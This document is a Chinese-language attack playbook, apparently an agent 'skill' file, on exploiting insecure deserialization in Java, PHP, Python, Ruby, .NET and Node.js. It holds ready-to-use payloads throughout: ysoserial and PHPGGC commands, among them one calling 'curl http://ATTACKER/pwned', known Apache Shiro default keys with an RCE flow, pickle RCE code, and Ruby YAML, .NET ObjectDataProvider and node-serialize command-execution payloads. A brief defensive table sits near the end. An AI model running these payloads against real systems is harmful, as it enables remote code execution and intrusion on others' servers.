# 技能：不安全的反序列化 — 专家攻击演练手册

> **AI 加载指令**：涵盖 Java、PHP 和 Python 的专家级反序列化技术。包括 gadget 链选择、流量指纹识别、工具使用（ysoserial、PHPGGC）、Shiro/WebLogic/Commons Collections 特定内容、Phar 反序列化以及 Python pickle 滥用。基础模型通常无法区分找到 sink 和找到可用的 gadget 链之间的区别。

## 0. 相关路由

- [jndi-injection](../jndi-injection/SKILL.md) 当反序列化导致 JNDI 查询（例如，通过 LDAP 的 JDK 8u191 之后的绕过 → 反序列化）
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) 当反序列化端点是一个暴露的管理服务（RMI Registry、T3、AJP）
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) 当 WAF 阻止你的 BCEL ClassLoader 或 Fastjson `@type` 负载 — Ghost Bits 将每个字节码字节包装在一个 Unicode 字符中，其低 8 位匹配，生成 WAF 无法指纹识别的负载

### 高级参考

当您需要时，也加载 [JAVA_GADGET_CHAINS.md](./JAVA_GADGET_CHAINS.md)：
- Java gadget 链版本兼容性矩阵（CommonsCollections 1–7、CommonsBeanutils、Spring、JDK 仅、Groovy、Hibernate、ROME、C3P0 等）
- SnakeYAML gadget（ScriptEngineManager/URLClassLoader）与利用 JAR 结构
- Hessian/Kryo/Avro/XStream 反序列化模式和流量指纹
- .NET ViewState 反序列化（machineKey 要求，使用 ysoserial.net 对 ViewState 进行伪造，Blacklist3r）
- Ruby YAML.load 与 YAML.safe_load 利用特定于版本的链
- 检测指纹：按格式（Java `AC ED`、.NET `AAEAAD`、Python pickle `80 0N`、PHP `O:`、Ruby `04 08`）的魔数表

---

## 1. 流量指纹识别 — 这是反序列化吗？

### Java 序列化对象

| 指示器 | 查找位置 |
|---|---|
| 十六进制 `ac ed 00 05` | 请求/响应体中的原始二进制、cookie、POST 参数 |
| Base64 `rO0AB` | cookie（`rememberMe`）、隐藏表单字段、JWT 声明 |
| `Content-Type: application/x-java-serialized-object` | HTTP 头部 |
| T3/IIOP 协议流量 | WebLogic 端口（7001、7002） |

### PHP 序列化对象

| 指示器 | 查找位置 |
|---|---|
| `O:NUMBER:"ClassName"` 模式 | POST 正文、cookie、会话文件 |
| `a:NUMBER:{`（数组） | 相同位置 |
| `phar://` URI 使用 | 接受用户控制路径的文件操作 |

### Python Pickle

| 指示器 | 查找位置 |
|---|---|
| 十六进制 `80 03` 或 `80 04`（协议 3/4） | 请求中的二进制数据、消息队列 |
| Base64 编码的二进制块 | API 参数、cookie、Redis 值 |
| `pickle.loads` / `pickle.load` 在源代码中 | 代码审查 / 白盒 |

---

## 2. Java — Gadget 链和工具

### ysoserial — 主要工具

```bash
# 生成负载（示例：CommonsCollections1 链带命令）
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" > payload.bin

# 用于 HTTP 传输的 Base64 编码
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0

# 常见链尝试（按易受攻击的依赖项频率排序）：
# CommonsCollections1-7  — Apache Commons Collections 3.x / 4.x
# Spring1, Spring2       — Spring Framework
# Groovy1               — Groovy
# Hibernate1            — Hibernate
# JBossInterceptors1    — JBoss
# Jdk7u21               — JDK 7u21（无额外依赖）
# URLDNS                — 仅 DNS 确认（无 RCE，适用于所有地方）
```

### URLDNS — 安全确认探测

URLDNS 触发 DNS 查询而不进行 RCE — 安全用于确认反序列化而不造成损害：

```bash
java -jar ysoserial.jar URLDNS "http://UNIQUE_TOKEN.burpcollaborator.net" > probe.bin
```

合作者上的 DNS 匹配 = 确认反序列化。然后升级到 RCE 链。

### Commons Collections — 经典链

当 `org.apache.commons.collections`（3.x）在类路径上且应用程序对未受信任的数据调用 `readObject()` 时存在漏洞。

链中的关键类：`InvokerTransformer` → `ChainedTransformer` → `TransformedMap` → 在反序列化期间触发 `Runtime.exec()`。

### Apache Shiro — rememberMe 反序列化

Shiro 使用 AES-CBC 加密序列化的 Java 对象在 `rememberMe` cookie 中。

```text
已知硬编码的密钥（SHIRO-550 / CVE-2016-4437）：
kPH+bIxk5D2deZiIxcaaaA==          # 最常见的默认值
wGJlpLanyXlVB1LUUWolBg==          # 另一个常见的默认值在旧版本中
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
```

**攻击流程**：
1. 检测：响应设置 `rememberMe=deleteMe` cookie 在无效会话上
2. 生成 ysoserial 负载（推荐 CommonsCollections6 以实现广泛兼容性）
3. 使用已知密钥 + 随机 IV 对 AES-CBC 进行加密
4. Base64 编码 → 设置为 `rememberMe` cookie 值
5. 发送请求 → 服务器解密 → 反序列化 → RCE

**DNSLog 确认**（在完整 RCE 之前）：使用 URLDNS 链 → `java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn"` → 加密 → 设置 cookie → 检查 DNSLog 是否有匹配。

**修复后（随机密钥）**：密钥仍可能通过填充攻击者泄露，或另一个 CVE（SHIRO-721）。

### WebLogic 反序列化

多个向量：
- **T3 协议**（端口 7001）：直接序列化对象注入
- **XMLDecoder**（CVE-2017-10271）：基于 XML 的反序列化通过 `/wls-wsat/CoordinatorPortType`
- **IIOP 协议**：T3 的替代方案

```bash
# T3 探测 — 检查 T3 是否暴露：
nmap -sV -p 7001 TARGET
# 查找服务横幅中的 "T3" 或 "WebLogic"
```

### Java RMI Registry

RMI Registry（端口 1099）按设计接受序列化对象：

```bash
# ysoserial 用于 RMI 的利用模块：
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit TARGET 1099 CommonsCollections1 "id"

# 需要：目标类路径上的易受攻击库
# 工作：JDK <= 8u111 无 JEP 290 反序列化过滤器
```

### JDK 版本限制

| JDK 版本 | 影响 |
|---|---|
| < 8u121 | RMI/LDAP 远程类加载工作 |
| 8u121-8u190 | `trustURLCodebase=false` 对于 RMI；LDAP 仍然工作 |
| >= 8u191 | RMI 和 LDAP 远程类加载被阻止 |
| >= 8u191 绕过 | 使用 LDAP → 返回序列化的 gadget 对象（不是远程类） |

---

## 3. PHP — unserialize 和 PHAR

### 魔术方法链

PHP 反序列化按顺序触发魔术方法：

```
__wakeup()  → 调用 unserialize() 立即调用
__destruct() → 对象被垃圾回收时调用
__toString() → 对象作为字符串使用时调用
__call()     → 调用不可访问的方法时调用
```

**攻击**：构建一个序列化对象，其 `__destruct()` 或 `__wakeup()` 触发危险操作（文件写入、SQL 查询、命令执行、SSRF）。

### 序列化对象格式

```php
O:8:"ClassName":2:{s:4:"prop";s:5:"value";s:4:"cmd";s:2:"id";}
// O:LENGTH:"CLASS":PROP_COUNT:{PROPERTIES}
```

### phpMyAdmin 配置注入（真实案例）

phpMyAdmin `PMA_Config` 类通过 `source` 属性读取任意文件：

```text
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}
```

### PHPGGC — PHP Gadget 链生成器

```bash
# 列出可用链：
phpggc -l

# 生成负载（示例：Laravel RCE）：
phpggc Laravel/RCE1 system id

# 常见链：
# Laravel/RCE1-10
# Symfony/RCE1-4
# Guzzle/RCE1
# Monolog/RCE1-2
# WordPress/RCE1
# Slim/RCE1
```

### Phar 反序列化

Phar 存档包含序列化的元数据。对 `phar://` URI 的任何文件操作都会触发反序列化 — 即使 `unserialize()` 从未直接调用。

**触发函数**（部分列表）：
```
file_exists()    file_get_contents()    fopen()
is_file()        is_dir()               copy()
filesize()       filetype()             stat()
include()        require()              getimagesize()
```

**攻击流程**：
1. 上传一个有效文件（例如，带有 phar 多字节码的 JPEG）
2. 触发文件操作：`file_exists("phar://uploads/avatar.jpg")`
3. PHP 反序列化 phar 元数据 → gadget 链执行

```bash
# 使用 PHPGGC 生成 phar：
phpggc -p phar -o exploit.phar Monolog/RCE1 system id
```

---

## 4. PYTHON — PICKLE

### __reduce__ 方法

Python 的 `pickle.loads()` 在反序列化期间对对象调用 `__reduce__()`，它可以返回一个可调用对象 + 参数：

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
# 将负载发送到调用 pickle.loads() 的目标
```

### 分析 Pickle 操作码

```python
import pickletools
pickletools.dis(payload)
# 显示操作码：GLOBAL、REDUCE 等
# 查找引用危险模块（os、subprocess、builtins）的全局
```

### 常见的 Python 反序列化 sink

```python
pickle.loads(user_data)
pickle.load(file_handle)
yaml.load(data)           # PyYAML 没有 Loader=SafeLoader
jsonpickle.decode(data)
shelve.open(path)
```

### 防御绕过：RestrictedUnpickler

即使 `RestrictedUnpickler.find_class` 使用，也要检查白名单是否过于宽泛：

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(f"forbidden: {module}.{name}")
```

如果 `safe_builtins` 包括 `eval`、`exec` 或 `__import__` → 仍然可利用。

---

## 5. 检测方法

```
在请求/cookie 中找到二进制块或编码对象？
├── Java 签名（ac ed / rO0AB）？
│   ├── 使用 URLDNS 探测进行安全确认
│   ├── 识别库（错误消息、已知产品）
│   └── 尝试与识别的库匹配的 ysoserial 链
│
├── PHP 签名（O:N:"...)？
│   ├── 识别框架（Laravel、Symfony、WordPress）
│   ├── 尝试该框架的 PHPGGC 链
│   └── 检查文件操作中是否存在 `phar://` 包装器
│
├── Python（不透明二进制、Base64 块）？
│   ├── 尝试带 DNS 回调的 pickle 负载
│   └── 检查是否使用 PyYAML 不安全的加载
│
└── 不确定？
    ├── 尝试 Java 的 URLDNS 负载 — 检查 DNS
    ├── 尝试 PHP 序列化测试字符串
    └── 监控错误消息以查找类加载失败
```

---

## 6. 防御意识

| 语言 | 缓解措施 |
|---|---|
| Java | JEP 290 反序列化过滤器；白名单允许的类；避免 `ObjectInputStream` 在未受信任的数据上；使用 JSON/Protobuf 代替 |
| PHP | 避免 `unserialize()` 在用户输入上；使用 `json_decode()` 代替；在文件操作中阻止 `phar://` |
| Python | 仅对可信数据使用 `pickle`；对外部输入使用 `json`；PyYAML：始终使用 `yaml.safe_load()` |

---

## 7. 快速参考 — 关键负载

```text
# Java — URLDNS 确认
java -jar ysoserial.jar URLDNS "http://TOKEN.collab.net"

# Java — 通过 CommonsCollections 进行 RCE
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned"

# PHP — Laravel RCE
phpggc Laravel/RCE1 system "id"

# PHP — Phar 多字节码
phpggc -p phar -o exploit.phar Monolog/RCE1 system "id"

# Python — Pickle RCE
python3 -c "import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())"

# Shiro 默认密钥测试
rememberMe=<AES-CBC(key=kPH+bIxk5D2deZiIxcaaaA==, payload=ysoserial_output)>
```

---

## 8. RUBY 反序列化

### Ruby Marshal

- `Marshal.load` 在未受信任的数据上 → RCE
- 指纹：二进制数据，无常见文本头部
- 存在针对各种 Ruby 版本的 gadget 链
- Docker 验证：通过 `[hex_string].pack("H*")` 的十六进制负载

### Ruby YAML (YAML.load)

- `YAML.load`（不是 `YAML.safe_load`）执行任意 Ruby 对象
- **Ruby < 2.7.2**：`Gem::Requirement` 链 → `git_set: id` / `git_set: sleep 600`
- **Ruby 2.x-3.x**：`Gem::Installer` → `TarReader` → `Kernel#system` 链（更复杂，多步骤）
- 始终测试：`YAML.load("--- !ruby/object:Gem::Installer\ni: x")` 以检查类实例化检查
- 负载模板：

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  type: :runtime
  specs:
    - !ruby/object:Gem::StubSpecification
      loaded_from: "|id"
```

- 注意：`YAML.safe_load` 是安全的（Ruby 2.1+）；`Psych.safe_load` 也安全

---

## 9. .NET 反序列化

- **流量指纹**：
  - BinaryFormatter：十六进制 `AAEAAD`（Base64 `AAEAAAD/////`）
  -ViewState：十六进制 `FF01` 或 `/w` 前缀
  - JSON.NET：JSON 中的 `$type` 属性
- **BinaryFormatter**（最危险，.NET 5+ 中已弃用）：任意类型实例化
- **XmlSerializer**：`ObjectDataProvider` + `XamlReader` 链用于命令执行

  ```xml
  <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:od="http://schemas.microsoft.com/powershell/2004/04" type="System.Windows.Data.ObjectDataProvider">
    <od:MethodName>Start</od:MethodName>
    <od:MethodParameters><sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">cmd</sys:String><sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">/c calc</sys:String></od:MethodParameters>
    <od:ObjectInstance xsi:type="System.Diagnostics.Process"/>
  </root>
  ```

- **NetDataContractSerializer**：类似于 BinaryFormatter，XML 中的完整类型信息
- **LosFormatter**：用于 ViewState，反序列化为 `ObjectStateFormatter`
- **JSON.NET**：`$type` 属性启用类型控制 → `ObjectDataProvider` + `ExpandedWrapper` 链

  ```json
  {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName":"Start",
  "MethodParameters":{
    "$type":"System.Collections.ArrayList, mscorlib",
    "$values":["cmd","/c whoami"]
  },
  "ObjectInstance":{
    "$type":"System.Diagnostics.Process, System"
  }
  }
  ```
  漏洞：当 `TypeNameHandling` 设置为 `Auto`、`Objects`、`Arrays` 或 `All` 时

- **工具**：`pwntester/ysoserial.net` — 主要的 .NET 反序列化负载生成器
- Gadget 链：TypeConfuseDelegate、TextFormattingRunProperties、PSObject、ActivitySurrogateSelectorFromFile

---

## 10. NODE.JS 反序列化

- **node-serialize**：`unserialize()` 使用 IIFE（立即调用函数表达式）
  - 负载标记：`_$$ND_FUNC$$_`
  - 在末尾添加 `()` 以自动执行：

  ```json
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"
  ```

- **funcster**：`__js_function` 属性 → `constructor.constructor` 访问 `process`

  ```json
  {"__js_function":"function(){var net=this.constructor.constructor('return this')().process.mainModule.require('child_process');return net.execSync('id').toString()}()"
  ```

- **PHP create_function + 反序列化组合**
```php
// 当 PHP 类在 __destruct 或 __wakeup 中使用 create_function 时：
// 序列化一个对象，其中：
$a = "create_function";
$b = ";}system('id');/*";
// lambda 身体变为：function(){ ;}system('id');/* }
// 关闭原始函数体，注入命令，注释掉其余部分

// 在序列化形式中（带有私有属性 \0ClassName\0）:
O:8:"ClassName":2:{s:13:"\0ClassName\0func";s:15:"create_function";s:12:"\0ClassName\0arg";s:18:";}system('id');/*";}
```
